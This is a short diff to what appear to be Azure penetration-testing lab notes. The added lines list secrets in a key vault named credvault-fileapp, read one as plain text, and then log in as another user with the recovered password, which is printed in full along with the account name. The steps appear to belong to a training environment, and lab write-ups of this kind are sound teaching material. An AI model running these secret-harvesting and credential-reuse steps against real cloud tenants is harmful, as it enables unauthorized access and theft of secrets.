@@ -1026,3 +1026,18 @@ Now, list the resources readable by the service principal:
 ```
 Get-AzResource
 ```
+
+Sweet! Access to a key vault! Check if we can list and read any secrets! 
+```
+Get-AzKeyVaultSecret -VaultName credvault-fileapp
+Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
+```
+
+Let's use the above credentials to authenticate:
+```
+$password = ConvertTo-SecureString 'IpadPr0@M0b1leUs3r@t0rganization' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('DavidDHenriques@defcorphq.onmicrosoft.com', $password)
+Connect-AzAccount -Credential $creds
+```
+
+
